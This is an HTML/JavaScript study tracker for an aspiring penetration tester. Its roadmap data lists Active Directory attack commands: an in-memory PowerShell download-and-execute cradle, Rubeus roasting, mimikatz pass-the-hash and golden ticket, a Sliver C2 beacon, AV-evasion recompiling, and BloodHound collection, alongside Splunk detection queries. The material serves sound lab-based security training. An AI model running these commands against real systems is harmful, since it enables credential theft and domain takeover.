<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Titan Tracker v9 (Stable)</title>
<style>
    :root {
        --bg-color: #0b0c15;
        --glass-panel: rgba(20, 25, 40, 0.85);
        --glass-border: rgba(255, 255, 255, 0.1);
        --primary: #6c5ce7;
        --accent: #00cec9;
        --success: #00b894;
        --text: #ffffff;
        --text-muted: #b2bec3;

        /* Table Status Colors */
        --st-todo: #636e72;
        --st-scan: #f9ca24;
        --st-foot: #f0932b;
        --st-priv: #be2edd;
        --st-root: #6ab04c;
        --st-stuck: #eb4d4b;
    }

    body {
        margin: 0; padding: 0;
        font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background-color: var(--bg-color);
        color: var(--text);
        height: 100vh;
        overflow: hidden;
    }

    /* --- ANIMATED BACKGROUND --- */
    .nebula-bg {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background: linear-gradient(125deg, #0b0c15, #1e0b2b, #091c2b);
        background-size: 400% 400%;
        animation: gradientBG 15s ease infinite;
        z-index: -2;
    }
    .grid-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
        background-size: 50px 50px;
        z-index: -1;
    }
    @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

    /* --- LAYOUT --- */
    .app-container {
        display: flex; flex-direction: column; height: 100%;
        max-width: 1400px; margin: 0 auto; padding: 20px; box-sizing: border-box;
    }

    /* --- HEADER --- */
    .header {
        display: flex; justify-content: space-between; align-items: center;
        background: var(--glass-panel); backdrop-filter: blur(12px);
        border: 1px solid var(--glass-border); padding: 20px 30px;
        border-radius: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
    }
    .header h1 { margin: 0; font-size: 1.5rem; letter-spacing: 1px; background: linear-gradient(to right, #fff, #a29bfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    
    .countdown-pill {
        background: rgba(214, 48, 49, 0.2); color: #ff7675;
        padding: 5px 15px; border-radius: 20px; font-size: 0.8rem;
        font-weight: bold; border: 1px solid rgba(214, 48, 49, 0.3);
        margin-left: 10px;
    }

    .progress-wrapper { text-align: right; width: 300px; }
    .progress-bar-bg { background: rgba(255,255,255,0.1); height: 10px; border-radius: 5px; overflow: hidden; margin-top: 5px; }
    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); width: 0%; transition: width 0.5s ease; }

    /* --- VIEWS --- */
    .viewport { flex: 1; position: relative; overflow: hidden; }
    .view {
        position: absolute; top: 0; left: 0; width: 100%; height: 100%;
        transition: transform 0.4s ease, opacity 0.4s ease;
        overflow-y: auto; padding-bottom: 50px;
    }
    .view.hidden { transform: translateX(-20px); opacity: 0; pointer-events: none; }
    
    /* Scrollbar */
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }

    /* --- MAP --- */
    .map-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; padding: 10px; }
    .phase-card {
        background: var(--glass-panel); border: 1px solid var(--glass-border);
        border-radius: 16px; padding: 25px; cursor: pointer; transition: 0.3s;
        position: relative; overflow: hidden;
    }
    .phase-card:hover { transform: translateY(-5px); border-color: var(--accent); }
    .phase-icon { font-size: 2.5rem; margin-bottom: 10px; }
    .phase-num { font-size: 0.7rem; text-transform: uppercase; color: var(--text-muted); letter-spacing: 2px; }
    .phase-title { font-size: 1.2rem; margin: 5px 0 10px; font-weight: 700; }
    .mini-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); margin-top: 15px; border-radius: 2px; }

    /* --- DETAILS --- */
    .detail-nav { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px;}
    .back-btn { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 8px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; }
    .back-btn:hover { background: var(--accent); color: #000; }

    /* --- MISSION CARD (Expandable) --- */
    .mission-container { display: flex; flex-direction: column; gap: 15px; }
    .mission-card {
        background: rgba(30, 30, 50, 0.6); border: 1px solid var(--glass-border);
        border-radius: 12px; overflow: hidden; transition: 0.3s;
    }
    .mission-card:hover { border-color: rgba(255,255,255,0.3); }
    
    .m-header {
        padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
        cursor: pointer; background: rgba(255,255,255,0.02);
    }
    .m-title { font-weight: bold; font-size: 1.05rem; }
    .m-date { font-size: 0.8rem; color: var(--success); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }

    .m-body {
        max-height: 0; overflow: hidden; transition: max-height 0.4s ease;
        border-top: 1px solid transparent; background: rgba(0,0,0,0.2);
    }
    .mission-card.open .m-body { max-height: 800px; border-top-color: var(--glass-border); }
    .m-content { padding: 20px; }
    
    .lbl { font-size: 0.7rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px;}
    .m-desc { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 15px; line-height: 1.5; }
    .m-cmd { 
        background: #151520; padding: 10px; border-radius: 6px; 
        font-family: monospace; color: var(--accent); font-size: 0.85rem; margin-bottom: 15px;
        border-left: 3px solid var(--accent);
    }
    .m-notes {
        width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
        color: white; padding: 10px; border-radius: 6px; font-family: inherit; margin-bottom: 10px; min-height: 60px;
    }
    .m-btn {
        width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase;
        background: var(--glass-border); color: #aaa; transition: 0.2s;
    }
    .m-btn:hover { background: var(--accent); color: #000; }
    
    /* Mastered State */
    .mission-card.mastered { border-color: var(--success); background: rgba(0, 184, 148, 0.05); }
    .mission-card.mastered .m-btn { background: var(--success); color: #000; }

    /* --- WAR ROOM TABLE --- */
    .wr-container { display: none; }
    .wr-stats { display: flex; gap: 15px; margin-bottom: 20px; }
    .wr-card { 
        flex: 1; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); 
        padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; 
    }
    .wr-row {
        background: rgba(30, 30, 50, 0.5); border: 1px solid var(--glass-border);
        border-radius: 8px; padding: 10px; margin-bottom: 10px;
        display: grid; grid-template-columns: 50px 1.5fr 1fr 1fr 1.5fr 2fr; gap: 10px;
        align-items: center;
    }
    .wr-row[data-status="root"] { border-left: 4px solid var(--st-root); }
    .wr-input {
        background: transparent; border: none; border-bottom: 1px solid #444; width: 100%;
        color: #ddd; padding: 4px; font-family: monospace;
    }
    .wr-select {
        background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; width: 100%; padding: 5px;
    }
    
    /* Reset Button */
    .reset-btn { position: fixed; bottom: 10px; right: 10px; font-size: 0.7rem; color: #555; cursor: pointer; }

</style>
</head>
<body>

<div class="nebula-bg"></div>
<div class="grid-overlay"></div>

<div class="app-container">
    
    <div class="header">
        <div class="header-info">
            <div style="display:flex; align-items:center;">
                <h1>TITAN TRACKER</h1>
                <div class="countdown-pill" id="countdown">Loading...</div>
            </div>
            <p>Target: Infrastructure Penetration Tester ($600+) ‚Ä¢ Deadline: June 2026</p>
        </div>
        <div class="progress-wrapper">
            <div style="display:flex; justify-content:space-between;">
                <span class="progress-text" style="color:white; font-size:0.7rem;">OVERALL COMPLETION</span>
                <span class="progress-text" id="global-percent">0%</span>
            </div>
            <div class="progress-bar-bg">
                <div class="progress-fill" id="global-bar"></div>
            </div>
        </div>
    </div>

    <div class="viewport">
        
        <div id="view-map" class="view">
            <div class="map-grid" id="card-container"></div>
        </div>

        <div id="view-detail" class="view hidden">
            <div class="detail-nav">
                <button class="back-btn" onclick="goHome()">‚ùÆ RETURN TO MAP</button>
                <div style="text-align: right;">
                    <small style="color:#888; letter-spacing:2px; display:block;">OPERATIONAL PHASE</small>
                    <span style="font-size:1.5rem; font-weight:bold;" id="dt-title">Title</span>
                </div>
            </div>
            
            <div class="mission-container" id="mission-container"></div>
            <div class="wr-container" id="war-room"></div>
        </div>

    </div>
</div>

<div class="reset-btn" onclick="hardReset()">Reset Data</div>

<script>
    // --- 1. DATA (Detailed Checkpoints) ---
    const roadmap = [
        { 
            id: 0, type: 'check', title: "Infrastructure (The Lab)", icon: "üèóÔ∏è", 
            items: [
                { title: "Virtualization Engine", desc: "Install VMware Workstation Pro (Recommended) or VirtualBox. Enable VT-x/AMD-V in BIOS. Configure a custom NAT Network (e.g., 192.168.56.0/24) to isolate lab from home WiFi.", cmd: "Network Editor -> VMnet8 -> Subnet IP: 192.168.56.0" },
                { title: "Domain Controller Setup", desc: "Install Windows Server 2019. Set Static IP (192.168.56.10). Rename PC to 'DC01'. Install AD DS Role. Promote to Domain Controller. Create Forest 'corp.local'.", cmd: "Install-WindowsFeature AD-Domain-Services -IncludeManagementTools" },
                { title: "AD Structure & Users", desc: "Open AD Users & Computers. Create OUs: 'IT', 'HR', 'Sales'. Create Service Accounts (sql_svc). Create 5 dummy users. **Critical:** Give one user 'Do not require Kerberos pre-auth'.", cmd: "New-ADUser -Name 'JDoe' -Path 'OU=IT,DC=corp,DC=local' -Enabled $true" },
                { title: "Attack Box Configuration", desc: "Install Kali Linux. Update Repos. Edit /etc/hosts to point 'dc01.corp.local' to 192.168.56.10. Ensure ping connectivity.", cmd: "echo '192.168.56.10 dc01.corp.local' >> /etc/hosts" },
                { title: "Blue Team Logging", desc: "Install Splunk Free on a standalone VM (Ubuntu or Win). Install Universal Forwarder on the DC to ship 'Security' logs to Splunk.", cmd: "inputs.conf: [WinEventLog://Security] disabled = 0" }
            ]
        },
        { 
            id: 1, type: 'check', title: "Foundations & Theory", icon: "üß†", 
            items: [
                { title: "Kerberos: AS-REQ / AS-REP", desc: "Authentication Service. User sends timestamp encrypted with their hash. KDC replies with TGT. *Vulnerability:* If pre-auth disabled -> AS-REP Roasting.", cmd: "Wireshark Filter: kerberos.msg_type == 10 (AS-REQ)" },
                { title: "Kerberos: TGS-REQ / TGS-REP", desc: "Ticket Granting Service. User presents TGT to request access to a Service (SPN). KDC returns Service Ticket. *Vulnerability:* TGS-REP contains Service Hash -> Kerberoasting.", cmd: "Wireshark Filter: kerberos.msg_type == 12 (TGS-REQ)" },
                { title: "NTLMv2 Handshake", desc: "Understand the Challenge/Response mechanism. 1. Negotiate, 2. Challenge, 3. Authenticate. *Vulnerability:* Relay attacks (SMBRelay).", cmd: "Tool: Responder -I eth0 -wrf" }
            ]
        },
        { 
            id: 2, type: 'check', title: "Weaponization", icon: "‚öîÔ∏è", 
            items: [
                { title: "PowerShell Execution Policy", desc: "Bypass restrictions. Run scripts in memory without touching disk to evade basic AV.", cmd: "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.56.5/script.ps1')\"" },
                { title: "Tool Compilation", desc: "Defender flags default Rubeus.exe. Download source from GitHub, open in Visual Studio, change Assembly Info, compile Release build.", cmd: "csc.exe /target:exe /out:MyRubeus.exe Rubeus.cs" },
                { title: "C2 Framework", desc: "Setup Sliver C2. Generate a beacon. Execute on victim. Test 'whoami' connectivity.", cmd: "./sliver-server -> generate --mtls 192.168.56.5" }
            ]
        },
        { 
            id: 3, type: 'check', title: "Enumeration (Recon)", icon: "üîç", 
            items: [
                { title: "Bloodhound Data Collection", desc: "Run SharpHound.exe from a non-admin user context. Collect All properties. Exfiltrate the zip file.", cmd: ".\\SharpHound.exe -c All" },
                { title: "Analysis: Shortest Path", desc: "Import data to Neo4j. Query: 'Find Shortest Path to Domain Admins'. Look for 'ForceChangePassword' or 'GenericAll'.", cmd: "Cypher: MATCH p=shortestPath((u:User)-[r*1..]->(g:Group {name:'DOMAIN ADMINS'})) RETURN p" },
                { title: "PowerView: ACL Hunting", desc: "Find objects where 'Everyone' or 'Authenticated Users' have Write access.", cmd: "Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match 'S-1-1-0'}" }
            ]
        },
        { 
            id: 4, type: 'check', title: "Red Team (Attack)", icon: "üö©", 
            items: [
                { title: "AS-REP Roasting", desc: "Identify users without pre-auth. Request ticket. Crack hash offline.", cmd: "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt" },
                { title: "Kerberoasting", desc: "Request TGS for all SPNs. Export tickets. Crack with Hashcat mode 13100.", cmd: "Rubeus.exe kerberoast /nowrap" },
                { title: "Pass-The-Hash", desc: "Use NTLM hash of an admin to authenticate without knowing the password.", cmd: "mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH" },
                { title: "Golden Ticket", desc: "Compromise KRBTGT account. Forge a TGT valid for 10 years. Total domain dominance.", cmd: "mimikatz # kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5... /krbtgt:HASH /id:500" }
            ]
        },
        { 
            id: 5, type: 'check', title: "Blue Team (Defense)", icon: "üõ°Ô∏è", 
            items: [
                { title: "Detect: Kerberoasting", desc: "Hunt for Event ID 4769 where Ticket Encryption Type is 0x17 (RC4). Modern windows uses AES (0x12/0x11).", cmd: "Splunk: index=* EventCode=4769 Ticket_Encryption_Type=0x17" },
                { title: "Detect: Golden Ticket", desc: "Look for TGTs with lifetimes > 10 hours (default) or mismatched SIDs.", cmd: "Event ID 4624 (Logon) -> Look for Admin Logon from non-standard workstation" }
            ]
        },
        { 
            id: 6, type: 'check', title: "CRTP Certification", icon: "üéì", 
            items: [
                { title: "CRTP Lab Completion", desc: "Complete all Learning Objectives in the pentester academy portal.", cmd: "Action: Submit all 40 flags" },
                { title: "CRTP Exam", desc: "24-Hour Exam. compromise 5 machines + DC. Write report.", cmd: "Objective: Domain Admin in < 24h" }
            ]
        },
        { id: 7, type: 'war_room', title: "OffSec Labs (War Room)", icon: "üíÄ", labs: ["Access", "Heist", "Vault", "Nagoya", "Hokkaido", "Resourced", "Hutch", "Alpha", "Beta", "Gamma"] }
    ];

    // --- 2. STATE ---
    let progress = JSON.parse(localStorage.getItem('titan_v9_prog')) || {};
    let warData = JSON.parse(localStorage.getItem('titan_v9_war')) || {};

    // --- 3. INIT ---
    function init() {
        renderMap();
        updateGlobal();
        startTimer();
    }

    // --- 4. RENDER MAP ---
    function renderMap() {
        const grid = document.getElementById('card-container');
        grid.innerHTML = '';
        roadmap.forEach((phase, idx) => {
            let pct = 0;
            if(phase.type === 'check') {
                const phaseData = progress[idx] || {};
                let doneCount = 0;
                Object.values(phaseData).forEach(v => { if(v.date) doneCount++; });
                pct = Math.round((doneCount / phase.items.length) * 100);
            } else {
                let rooted = 0;
                phase.labs.forEach((_, i) => { if(warData[i]?.status === 'root') rooted++; });
                pct = Math.round((rooted/phase.labs.length)*100);
            }

            const card = document.createElement('div');
            card.className = 'phase-card';
            card.onclick = () => openPhase(idx);
            
            card.innerHTML = `
                <div class="phase-icon">${phase.icon}</div>
                <div class="phase-num">PHASE ${idx+1}</div>
                <div class="phase-title">${phase.title}</div>
                <div class="phase-progress"><span>${pct}% MASTERED</span></div>
                <div class="bar-bg"><div class="mini-bar" style="width:${pct}%; background:${pct===100?'var(--success)':'linear-gradient(90deg, var(--primary), var(--accent))'}; height:100%"></div></div>
            `;
            grid.appendChild(card);
        });
    }

    // --- 5. RENDER DETAIL ---
    function openPhase(id) {
        document.getElementById('view-map').classList.add('hidden');
        document.getElementById('view-detail').classList.remove('hidden');
        
        const phase = roadmap[id];
        document.getElementById('dt-title').innerText = phase.title;

        const mContainer = document.getElementById('mission-container');
        const wContainer = document.getElementById('war-room');

        if(phase.type === 'check') {
            mContainer.style.display = 'flex';
            wContainer.style.display = 'none';
            renderMissions(id, phase, mContainer);
        } else {
            mContainer.style.display = 'none';
            wContainer.style.display = 'block';
            renderWarRoom(phase, wContainer);
        }
    }

    function goHome() {
        document.getElementById('view-detail').classList.add('hidden');
        document.getElementById('view-map').classList.remove('hidden');
        renderMap();
    }

    // --- 6. MISSIONS ---
    function renderMissions(pid, phase, container) {
        container.innerHTML = '';
        const phaseData = progress[pid] || {};

        phase.items.forEach((item, idx) => {
            const itemData = phaseData[idx] || {};
            const isDone = !!itemData.date;
            
            const card = document.createElement('div');
            card.className = `mission-card ${isDone ? 'mastered' : ''}`;
            card.innerHTML = `
                <div class="m-header" onclick="this.parentElement.classList.toggle('open')">
                    <div class="m-title">${item.title}</div>
                    <div class="m-date">${isDone ? 'MASTERED: ' + itemData.date : ''}</div>
                </div>
                <div class="m-body">
                    <div class="m-content">
                        <span class="lbl" style="color:var(--primary)">STRATEGIC INTEL</span>
                        <div class="m-desc">${item.desc}</div>
                        
                        <span class="lbl" style="color:var(--accent)">EXECUTION</span>
                        <div class="m-cmd">${item.cmd}</div>
                        
                        <span class="lbl" style="color:#888">FIELD NOTES</span>
                        <textarea class="m-notes" placeholder="Notes..." oninput="saveNote(${pid}, ${idx}, this.value)">${itemData.notes || ''}</textarea>
                        
                        <button class="m-btn" onclick="toggleMission(${pid}, ${idx})">
                            ${isDone ? 'RE-OPEN MISSION' : 'MARK MASTERED & SIGN OFF'}
                        </button>
                    </div>
                </div>
            `;
            container.appendChild(card);
        });
    }

    function toggleMission(pid, tid) {
        if(!progress[pid]) progress[pid] = {};
        if(progress[pid][tid]?.date) {
            progress[pid][tid].date = null; // Uncheck
        } else {
            const today = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
            if(!progress[pid][tid]) progress[pid][tid] = { notes: '' };
            progress[pid][tid].date = today;
        }
        localStorage.setItem('titan_v9_prog', JSON.stringify(progress));
        openPhase(pid); // Refresh
        updateGlobal();
    }

    function saveNote(pid, tid, val) {
        if(!progress[pid]) progress[pid] = {};
        if(!progress[pid][tid]) progress[pid][tid] = { date: null, notes: '' };
        progress[pid][tid].notes = val;
        localStorage.setItem('titan_v9_prog', JSON.stringify(progress));
    }

    // --- 7. WAR ROOM ---
    function renderWarRoom(phase, container) {
        let root=0, win=0, lin=0;
        phase.labs.forEach((_, i) => {
            const d = warData[i] || {};
            if(d.status==='root') root++;
            if((d.os||'win')==='win' && d.status==='root') win++;
            if(d.os==='linux' && d.status==='root') lin++;
        });

        const html = `
            <div class="wr-stats">
                <div class="wr-card" style="border-color:var(--st-root)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--st-root)">${root}</span><br><span style="font-size:0.7rem;">PWNED</span></div></div>
                <div class="wr-card" style="border-color:var(--accent)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--accent)">${win}</span><br><span style="font-size:0.7rem;">WIN</span></div></div>
                <div class="wr-card" style="border-color:var(--st-scan)"><div><span style="font-size:1.5rem; font-weight:bold; color:var(--st-scan)">${lin}</span><br><span style="font-size:0.7rem;">LINUX</span></div></div>
            </div>
            <div style="display:grid; grid-template-columns:50px 1.5fr 1fr 1fr 1.5fr 2fr; padding:10px; font-size:0.7rem; color:#888; font-weight:bold;">
                <div>OS</div> <div>TARGET</div> <div>IP</div> <div>STATUS</div> <div>VECTOR</div> <div>NOTES</div>
            </div>
            <div id="wr-rows"></div>
        `;
        container.innerHTML = html;
        
        const rows = document.getElementById('wr-rows');
        phase.labs.forEach((name, idx) => {
            const d = warData[idx] || {os:'win', status:'todo', ip:'', vec:'', note:''};
            const icon = d.os === 'linux' ? 'üêß' : 'ü™ü';
            rows.innerHTML += `
                <div class="wr-row" data-status="${d.status}">
                    <div style="cursor:pointer; text-align:center;" onclick="toggleOS(${idx})">${icon}</div>
                    <div style="font-weight:bold;">${name}</div>
                    <div><input class="wr-input" value="${d.ip}" placeholder="IP..." oninput="saveWar(${idx}, 'ip', this.value)"></div>
                    <div>
                        <select class="wr-select" onchange="saveWar(${idx}, 'status', this.value)" style="color:var(--st-${d.status});">
                            <option value="todo" ${d.status==='todo'?'selected':''}>To Do</option>
                            <option value="scan" ${d.status==='scan'?'selected':''}>Scanning</option>
                            <option value="foot" ${d.status==='foot'?'selected':''}>Foothold</option>
                            <option value="priv" ${d.status==='priv'?'selected':''}>PrivEsc</option>
                            <option value="root" ${d.status==='root'?'selected':''}>ROOTED</option>
                        </select>
                    </div>
                    <div><input class="wr-input" value="${d.vec}" placeholder="Vector" oninput="saveWar(${idx}, 'vec', this.value)"></div>
                    <div><input class="wr-input" value="${d.note}" placeholder="Notes" oninput="saveWar(${idx}, 'note', this.value)"></div>
                </div>
            `;
        });
    }

    function toggleOS(idx) {
        if(!warData[idx]) warData[idx] = {os:'win', status:'todo'};
        warData[idx].os = warData[idx].os === 'win' ? 'linux' : 'win';
        saveWarData();
    }
    function saveWar(idx, f, v) {
        if(!warData[idx]) warData[idx] = {os:'win', status:'todo'};
        warData[idx][f] = v;
        saveWarData();
    }
    function saveWarData() {
        localStorage.setItem('titan_v9_war', JSON.stringify(warData));
        openPhase(7); // refresh
        updateGlobal();
    }

    // --- 8. UTILS ---
    function updateGlobal() {
        let total = 0, done = 0;
        roadmap.forEach((p, idx) => {
            if(p.type === 'check') {
                total += p.items.length;
                if(progress[idx]) Object.values(progress[idx]).forEach(v => { if(v.date) done++; });
            } else {
                total += p.labs.length;
                p.labs.forEach((_,i) => { if(warData[i]?.status === 'root') done++; });
            }
        });
        const pct = Math.round((done/total)*100);
        document.getElementById('global-bar').style.width = pct + '%';
        document.getElementById('global-percent').innerText = pct + '%';
    }

    function startTimer() {
        const target = new Date("2026-06-01").getTime();
        setInterval(() => {
            const d = Math.floor((target - new Date().getTime()) / (1000*60*60*24));
            document.getElementById('countdown').innerText = d + " DAYS LEFT";
        }, 1000);
    }
    
    function hardReset() {
        if(confirm("Reset all progress?")) {
            localStorage.clear();
            location.reload();
        }
    }

    init();
</script>
</body>
</html>
